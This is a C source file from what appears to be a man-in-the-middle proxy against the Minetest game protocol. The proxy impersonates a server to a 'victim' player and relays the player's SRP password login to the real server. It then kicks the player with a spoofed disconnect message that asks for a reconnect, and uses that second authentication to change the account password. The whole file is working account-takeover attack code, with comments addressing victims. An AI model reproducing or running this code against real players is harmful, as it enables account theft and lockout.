#include "mtserver.h"
#include "clientpacket.h"
#include "serverpacket.h"
#include <stdio.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include "mtclient.h"
#include <stdbool.h>
#include "util.h"

void send_to_client(void* pkt, size_t size, Proxy* proxy) {
    sendto(proxy->listen_fd, pkt, size, 0, (struct sockaddr*) &(proxy->victim_addr), sizeof(proxy->victim_addr));
}

void handle_clientpacket(void* raw_pkt, size_t size, Proxy* proxy) {
    static uint16_t seqnum = SEQNUM_INITAL;
    generic_header* header = raw_pkt;   
    const uint16_t clientcmd = get_pkt_command(raw_pkt, size);

    switch (clientcmd) {
    case ClientOp_Request_Peer_Id:
        puts("A client requests a peer id.");
        handle_toserver_request_peer_id((TOSERVER_REQUEST_PEERID*) raw_pkt, &seqnum, proxy);
    break;

    case ClientOp_ToServer_Init:
        handle_toserver_init((TOSERVER_INIT*) raw_pkt, size, &seqnum, proxy);
        if (proxy->client.username == NULL) {
            puts("Failed to parse the victim's name");
            return;
        }
        printf("The victim's name is %s !\n", proxy->client.username);
    return;

    case ClientOp_ToServer_SRP_A:
        handle_toserver_srp_bytes_a((TOSERVER_SRP_BYTES_A*) raw_pkt, size, &seqnum, proxy);
    break;

    case ClientOp_ToServer_SRP_M:
        handle_toserver_srp_bytes_m((TOSERVER_SRP_BYTES_M*) raw_pkt, size, &seqnum, proxy);
    break;

    case ClientOp_ToServer_Disco:
        puts("The victim has disconnected");
    break;
    
    default:
        printf("Received unhandled clientpacket of type :%i\n", clientcmd);
    break;
    }

    if (header->nextheader_type == TYPE_RELIABLE) {
        #ifdef DEBUG
                puts("ack-victim-ingoing!");
        #endif
        generic_reliable_header* reliable = raw_pkt + sizeof(generic_header);
        ack_clientpacket(reliable->seqnum, proxy);
    }
}

void ack_clientpacket(uint16_t seqnum, Proxy* proxy) {
    generic_ack_packet ack;
    prepare_ack_packet(PEER_ID_SERVER, seqnum, &ack);
    send_to_client(&ack, sizeof(ack), proxy);
}

#define VICTIM_PEER_ID 0x1234 // Any valid client peer id would do!
void handle_toserver_request_peer_id(TOSERVER_REQUEST_PEERID* pkt, uint16_t* seqnum, Proxy* proxy) {
    if (proxy->status > PROXY_WAIT) {
        return;
    }
    *seqnum = SEQNUM_INITAL;
    TOCLIENT_ASSIGN_PEER_ID outpkt;
    // Screw the docs... We're actually expecting the server's peer id!
    prepare_unreliable_packet(PEER_ID_SERVER, &outpkt.header);
    prepare_reliable_header(&outpkt.reliable_header, seqnum, TYPE_CONTROL);

    outpkt.controlheader.controltype = ServerOp_Set_Peer_Id;
    outpkt.peer_id = VICTIM_PEER_ID;
    send_to_client(&outpkt, sizeof(outpkt), proxy);
    proxy->status = PROXY_REMOTE_LOGIN;
}

void handle_toserver_init(TOSERVER_INIT* pkt, size_t size, uint16_t* seqnum, Proxy* proxy) {
    char* name = ((char*) pkt) + sizeof(TOSERVER_INIT);
    if ((void*) name + pkt->name_len > (void*) pkt + size) {
        puts("It appears the client has tried to do a bufferoverflow on us!");
        return;
    }

    static TOCLIENT_HELLO hellopkt;
    if (proxy->status < PROXY_REMOTE_WAIT) {
        proxy->client.username = malloc(pkt->name_len + 1);
        if (proxy->client.username == NULL) {
            fatal_error("Out of memory!");
        }
        memcpy(proxy->client.username, name, pkt->name_len);
        proxy->client.username[pkt->name_len] = '\0';
        proxy->client.username_len = pkt->name_len;

        client_verbindung_vorbereiten(&proxy->client, &hellopkt);
        proxy->status = PROXY_REMOTE_WAIT;
    } else if (strncmp(proxy->client.username, name, pkt->name_len) != 0) {
        // Another client...
        return;
    }

    hellopkt.reliable_header.seqnum = *seqnum;
    *seqnum += 1;

    send_to_client(&hellopkt, sizeof(hellopkt), proxy);
}

void handle_toserver_srp_bytes_a(TOSERVER_SRP_BYTES_A* pkt, size_t size, uint16_t* seqnum, Proxy* proxy) {
    if (sizeof(TOSERVER_SRP_BYTES_A) + pkt->len > size) {
        return;
    }
    uint8_t* bytes_a = ((uint8_t*) pkt) + pkt->len;

    size_t size_s_b;
    TOCLIENT_SRP_S_B* sb = (TOCLIENT_SRP_S_B*) client_srp_A(&proxy->client, pkt, &size_s_b);
    sb->reliable_header.seqnum = *seqnum;
    *seqnum += 1;

    send_to_client(sb, size_s_b, proxy);
    free(sb);
}

void handle_toserver_srp_bytes_m(TOSERVER_SRP_BYTES_M* pkt, size_t size, uint16_t* seqnum, Proxy* proxy) {
    // Kick it so we get another auth-step
    kick_client(proxy, seqnum);
    
    if (sizeof(TOSERVER_SRP_BYTES_M) + pkt->len > size) {
        puts("Did the client just try to pull off a buffer-overflow on us?!");
        return;
    }

    const bool erfolg = client_srp_M(&proxy->client, pkt);
    if (erfolg) {
        if (proxy->status >= PROXY_REMOTE_SUDO) {
            client_change_password(&proxy->client, &proxy->client.seqnum, proxy->new_password);
            proxy->victim_passwort_changed_callback(proxy, proxy->client.username);
            return;
        }
        proxy->status = PROXY_REMOTE_SUDO;
        return;
    }
    puts("The server rejects us, the victim probably put the wrong password in");
    proxy->status = PROXY_WAIT; // All for nothing :(
    free(proxy->client.username);
}

void kick_client(Proxy* proxy, uint16_t* seqnum) {
    const uint16_t message_len = strlen(proxy->victim_kick_message);
    const size_t total_size = message_len + sizeof(TOCLIENT_ACCESS_DENIED);
    TOCLIENT_ACCESS_DENIED* denied_pkt = malloc(total_size);
    if (denied_pkt == NULL) {
        fatal_error("Out of memory!");
    }
    puts("Kicking the victim...");

    prepare_unreliable_packet(PEER_ID_SERVER, &denied_pkt->header);
    denied_pkt->header.nextheader_type = TYPE_RELIABLE;
    prepare_reliable_header(&denied_pkt->reliable_header, seqnum, TYPE_ORIGINAL);
    // Since the connection is officially terminated now, let's reset the seqnum
    *seqnum = SEQNUM_INITAL;

    denied_pkt->command = ServerOp_ToClient_Access_Denied;
    denied_pkt->reason = SERVER_ACCESSDENIED_SHUTDOWN;
    denied_pkt->custom_reason_len = message_len;
    memcpy((void*) denied_pkt + TOCLIENT_ACCESS_DENIED_REASON_OFFSET, proxy->victim_kick_message, message_len);
    bool* reconnect = (bool*) denied_pkt + total_size - 1;
    *reconnect = true;

    // Out it goes...
    send_to_client(denied_pkt, total_size, proxy);

    free(denied_pkt);
}
// EOF